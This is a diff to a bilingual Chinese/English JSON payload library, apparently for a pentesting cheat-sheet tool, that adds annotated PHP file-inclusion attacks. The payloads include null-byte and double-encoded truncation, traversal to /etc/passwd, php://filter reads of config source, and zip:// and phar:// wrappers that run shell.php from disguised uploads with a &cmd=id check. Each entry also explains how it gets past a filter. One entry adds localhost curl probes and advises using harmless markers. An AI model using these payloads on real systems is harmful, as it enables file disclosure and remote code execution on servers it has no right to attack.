@@ -1550,7 +1550,33 @@
           "description": {
             "zh": "绕过对单扩展校验逻辑：多个空字节与扩展叠加触发不同解析路径；passwd 内容返回即成功。",
             "en": "Stack null bytes with multiple extensions against single-extension validation; returned passwd content confirms success."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "../../../",
+              "explanation": {
+                "zh": "多级遍历前缀",
+                "en": "Multi-level traversal prefix"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "%00.html%00.php",
+              "explanation": {
+                "zh": "多空字节叠后缀",
+                "en": "Null bytes stacked with suffixes"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/etc/passwd",
+              "explanation": {
+                "zh": "目标系统文件",
+                "en": "Target system file"
+              },
+              "type": "url"
+            }
+          ]
         },
         {
           "title": {
@@ -1561,7 +1587,25 @@
           "description": {
             "zh": "绕过空字节已被禁用的旧版环境：超长路径在 4096 边界截断仍指向目标；文件读取成功即成功。",
             "en": "Overflow past the 4096 boundary when null bytes are disabled; a successful read confirms success."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "../../../etc/passwd",
+              "explanation": {
+                "zh": "遍历定位目标文件",
+                "en": "Traversal to the target file"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "............",
+              "explanation": {
+                "zh": "超长点填充路径",
+                "en": "Long dot-padded path"
+              },
+              "type": "payload"
+            }
+          ]
         },
         {
           "title": {
@@ -1572,7 +1616,167 @@
           "description": {
             "zh": "绕过对 %00 单层还原后拦截的规则：二次编码在应用层才截断；内容返回即成功。",
             "en": "Double-encode the null so truncation happens only at the application layer; returned content confirms success."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "%2500",
+              "explanation": {
+                "zh": "双重编码空字节",
+                "en": "Double-encoded null byte"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "/etc/passwd",
+              "explanation": {
+                "zh": "目标系统文件",
+                "en": "Target system file"
+              },
+              "type": "url"
+            },
+            {
+              "part": ".php",
+              "explanation": {
+                "zh": "截断目标后缀",
+                "en": "Suffix to be truncated"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "双重编码截断",
+            "en": "Double-encoded truncation"
+          },
+          "command": "page=shell%2500",
+          "description": {
+            "zh": "二次解码还原 %00。判据：包含 shell 而非 shell.php 模板。",
+            "en": "Second decode restores the null. Success: includes shell instead of the template."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "page=shell%2500",
+              "explanation": {
+                "zh": "二次解码 NUL",
+                "en": "Twice-decoded NUL"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%2500",
+              "explanation": {
+                "zh": "双重编码空字节",
+                "en": "Double-encoded NUL"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "全编码遍历包含",
+            "en": "Fully encoded inclusion"
+          },
+          "command": "page=%2e%2e%2fshell%00",
+          "description": {
+            "zh": "编码遍历加截断。判据：越目录包含成功。",
+            "en": "Encoded traversal plus truncation. Success: cross-directory include works."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "page=%2e%2e%2fshell%00",
+              "explanation": {
+                "zh": "编码遍历截断",
+                "en": "Encoded traversal with NUL"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%2e%2e%2f",
+              "explanation": {
+                "zh": "编码 ../",
+                "en": "Encoded dot-dot slash"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "filter+截断组合",
+            "en": "filter + truncation combo"
+          },
+          "command": "page=php://filter/resource=config%00",
+          "description": {
+            "zh": "过滤器内截断白名单后缀。判据：读出 config 源码。",
+            "en": "Truncates inside the filter wrapper. Success: config source read."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "page=php://filter/resource=config%00",
+              "explanation": {
+                "zh": "过滤器内截断",
+                "en": "Filter with NUL"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "config%00",
+              "explanation": {
+                "zh": "配置名截断",
+                "en": "Config name truncation"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "文件包含路径空字节边界验证块 1",
+            "en": "File-Include Path Null-Byte Boundary Validation Block 1"
+          },
+          "command": "BASE=\"http://127.0.0.1:8080\"\ncurl --fail --silent --show-error --max-time 3 \"$BASE/include?page=PAYLOADER_MARKER\"\ncurl --fail --silent --show-error --max-time 3 \"$BASE/include?page=../fixtures/PAYLOADER_MARKER%00\"\ncurl --fail --silent --show-error --max-time 3 \"$BASE/include?page=../fixtures/MISSING_MARKER%00\"\nprintf \"%s\\n\" \"compare parser log, canonical path, and exact PAYLOADER_MARKER output\"",
+          "description": {
+            "zh": "以 marker 正例与 MISSING 负例对照发送 %00 截断路径，验证 %00 截断在当前运行时的实际效果并比对解析日志。",
+            "en": "Sends %00-truncated paths with a marker positive case and a MISSING negative control, verifying the real effect of %00 truncation on the current runtime via parser logs."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "BASE=\"http://127.0.0.1:8080\"",
+              "explanation": {
+                "zh": "定义基线地址",
+                "en": "Defines the base URL"
+              },
+              "type": "control"
+            },
+            {
+              "part": "$BASE/include?page=PAYLOADER_MARKER",
+              "explanation": {
+                "zh": "正例基线",
+                "en": "Positive baseline"
+              },
+              "type": "url"
+            },
+            {
+              "part": "page=../fixtures/PAYLOADER_MARKER%00",
+              "explanation": {
+                "zh": "NUL 截断正例",
+                "en": "NUL truncation probe"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "page=../fixtures/MISSING_MARKER%00",
+              "explanation": {
+                "zh": "缺失负例",
+                "en": "Missing-file control"
+              },
+              "type": "payload"
+            }
+          ],
+          "platform": "linux",
+          "requiresAdmin": false
         }
       ]
     },
@@ -1707,7 +1911,33 @@
           "description": {
             "zh": "绕过对 %23 还原后成员名特征的拦截：分隔符二次编码；归档内代码被包含执行即成功。",
             "en": "Double-encode the member separator past post-decode inspection; the in-archive code being executed confirms success."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "zip://",
+              "explanation": {
+                "zh": "ZIP归档包装器",
+                "en": "ZIP archive wrapper"
+              },
+              "type": "url"
+            },
+            {
+              "part": "%2523",
+              "explanation": {
+                "zh": "双重编码的井号",
+                "en": "Double-encoded hash sign"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "ok.php",
+              "explanation": {
+                "zh": "归档内PHP成员",
+                "en": "PHP member in the archive"
+              },
+              "type": "value"
+            }
+          ]
         },
         {
           "title": {
@@ -1718,7 +1948,33 @@
           "description": {
             "zh": "绕过对 zip://./uploads/ 固定前缀的匹配：遍历形式仍到同一归档；命令执行输出返回即成功。",
             "en": "Reach the same archive through traversal past fixed-prefix matching; returned command output confirms success."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "../../uploads/",
+              "explanation": {
+                "zh": "遍历定位上传目录",
+                "en": "Traversal to the upload dir"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%23ok.php",
+              "explanation": {
+                "zh": "井号分隔成员",
+                "en": "Hash-separated member"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "&cmd=id",
+              "explanation": {
+                "zh": "执行验证参数",
+                "en": "Execution test parameter"
+              },
+              "type": "value"
+            }
+          ]
         },
         {
           "title": {
@@ -1729,7 +1985,175 @@
           "description": {
             "zh": "绕过对 zip/phar 与 .jpg 组合特征的检测：改用 gif 扩展的 phar 归档；代码执行成功即成功。",
             "en": "Switch to a GIF-extension phar archive against zip/jpg signature combos; successful code execution confirms success."
-          }
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "phar://",
+              "explanation": {
+                "zh": "PHAR归档包装器",
+                "en": "PHAR archive wrapper"
+              },
+              "type": "url"
+            },
+            {
+              "part": "wshell_gif.gif",
+              "explanation": {
+                "zh": "GIF扩展归档载体",
+                "en": "GIF-extension carrier"
+              },
+              "type": "value"
+            },
+            {
+              "part": "/shell.php",
+              "explanation": {
+                "zh": "归档内PHP成员",
+                "en": "PHP member in the archive"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "分隔符双重编码",
+            "en": "Double-Encoded Separator"
+          },
+          "command": "zip://shell.png%2523shell.php",
+          "description": {
+            "zh": "绕过对 %23 还原后 .php 成员特征的拦截：二次编码在应用层还原；归档代码执行即成功。",
+            "en": "Double-encode the member separator so it restores only in the application; in-archive code executing confirms success."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "zip://",
+              "explanation": {
+                "zh": "ZIP归档包装器",
+                "en": "ZIP archive wrapper"
+              },
+              "type": "url"
+            },
+            {
+              "part": "%2523",
+              "explanation": {
+                "zh": "双重编码的井号",
+                "en": "Double-encoded hash sign"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "shell.php",
+              "explanation": {
+                "zh": "归档内PHP成员",
+                "en": "PHP member in the archive"
+              },
+              "type": "value"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "绝对路径归档访问",
+            "en": "Absolute-Path Archive Access"
+          },
+          "command": "zip:///tmp/uploads/shell.png%23shell.php",
+          "description": {
+            "zh": "绕过对 zip:// 相对形式匹配：绝对路径访问同一上传归档；命令执行输出返回即成功。",
+            "en": "Access the same upload via an absolute path past relative-form matching; returned command output confirms success."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "zip:///tmp/uploads/",
+              "explanation": {
+                "zh": "绝对路径定位归档",
+                "en": "Absolute-path archive access"
+              },
+              "type": "url"
+            },
+            {
+              "part": "%23shell.php",
+              "explanation": {
+                "zh": "井号分隔成员",
+                "en": "Hash-separated member"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "扩展名轮换载体",
+            "en": "Extension-Rotated Carrier"
+          },
+          "command": "zip://shell.html%23shell.php",
+          "description": {
+            "zh": "绕过对 .png/.gif 组合特征的检测：轮换 html 扩展的同一归档；包含执行成功即成功。",
+            "en": "Rotate to an HTML-extension copy against image-combo signatures; successful inclusion confirms success."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "shell.html",
+              "explanation": {
+                "zh": "HTML扩展载体",
+                "en": "HTML-extension carrier"
+              },
+              "type": "value"
+            },
+            {
+              "part": "zip://",
+              "explanation": {
+                "zh": "ZIP归档包装器",
+                "en": "ZIP archive wrapper"
+              },
+              "type": "url"
+            },
+            {
+              "part": "%23shell.php",
+              "explanation": {
+                "zh": "井号分隔成员",
+                "en": "Hash-separated member"
+              },
+              "type": "payload"
+            }
+          ]
+        },
+        {
+          "title": {
+            "zh": "Zip Wrapper 容器扩展名变体",
+            "en": "Zip Wrapper Container Extension Variants"
+          },
+          "command": "zip://shell.png%23shell.php\nzip://shell.gif%23shell.php\nzip://shell.txt%23shell.php\nzip://shell.html%23shell.php\nzip://shell.zip%23shell.php",
+          "description": {
+            "zh": "逐容器名测试同一专用 ZIP，把 shell.php 内容改为固定文本或 echo 标记；先判断读取还是 include，不上传可接收命令的脚本。命中判据：容器内成员按预期被读取或包含执行并输出固定标记。",
+            "en": "Test the same dedicated ZIP under each container name, replacing shell.php with fixed text or echo marker. Determine read versus include behavior first and never upload a command-capable script. Success check: the member inside each container is read or included as expected and prints the fixed marker."
+          },
+          "syntaxBreakdown": [
+            {
+              "part": "zip://shell.png%23shell.php",
+              "explanation": {
+                "zh": "PNG载体ZIP成员",
+                "en": "PNG-carrier ZIP member"
+              },
+              "type": "payload"
+            },
+            {
+              "part": "%23",
+              "explanation": {
+                "zh": "井号成员分隔符",
+                "en": "Hash member separator"
+              },
+              "type": "operator"
+            },
+            {
+              "part": "shell.txt",
+              "explanation": {
+                "zh": "文本扩展载体",
+                "en": "Text-extension carrier"
+              },
+              "type": "value"
+            }
+          ],
+          "platform": "all",
+          "requiresAdmin": false
         }
       ]
     },
